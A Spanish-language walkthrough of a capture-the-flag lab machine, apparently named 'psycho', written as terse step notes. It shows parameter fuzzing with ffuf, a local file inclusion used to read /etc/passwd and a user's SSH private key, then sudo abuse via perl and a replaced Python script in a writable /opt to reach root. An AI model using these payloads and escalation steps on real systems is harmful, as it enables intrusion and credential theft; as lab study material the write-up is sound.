PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

-Entramos a la web y no vemos nada interesante

-Hacemos fuzzing de directoriosy encontramos /index.php

-Hacemos fuzzing de parámetros:
	-ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u "http://psycho/index.php?FUZZ=id" -c -fs 2596
		-Encontramos ruta --> secret

-Introducimos la ruta en la web:
	-http://psycho/index.php?secret=id

-Probamos a ver si se trata de un LFI (Local File Inclusion):
	-http://psycho/index.php?secret=/etc/passwd
	-Vemos el /etc/passwd!!

-Ahora que sabemos que estamos ante un LFI

-Probamos a leer la clave privada del usuario vaxei y efectivamente la podemos listar:
	-http://psycho/index.php?secret=/home/vaxei/.ssh/id_rsa
	-La guardamos y le damos permisos 0400

-Nos autenticamos por ssh con la id_rsa:
	-ssh -i id_rsa vaxei@172.17.0.2
	vaxei@6dc507778177:~$

## Escalada de Privilegios

vaxei@6dc507778177:~$ sudo -l
	(luisillo) NOPASSWD: /usr/bin/perl

-Pivotamos al usuario luisillo:
	-sudo -u luisillo /usr/bin/perl -e 'exec "/bin/sh";'
	luisillo@6dc507778177:/$

luisillo@6dc507778177:/$ sudo -l
    (ALL) NOPASSWD: /usr/bin/python3 /opt/paw.py
    -rw-rw-r-- 1 luisillo luisillo 32 Feb 20 19:20 /opt/paw.py

-No tenemos permisos para modificar el archivo

-Miramos los permisos que tenemos sobre el directorio /opt/:
	-ls -ld /opt
	drwxr-xrwx 1 root root 4096 Feb 20 19:20 /opt
	-Tenemos permisos de Escritura(w) sobre el directorio /opt/

-Podemos borrar el script de python y crear uno nuevo con el mismo nombre con código para escalar a root:
	-rm -rf paw.py
	-nano paw.py:
		import os
		os.system("/bin/sh")

-Ejecutamos el script nuevo con sudo y somos root:
	-sudo  /usr/bin/python3 /opt/paw.py
	root@6dc507778177:/opt# whoami
	root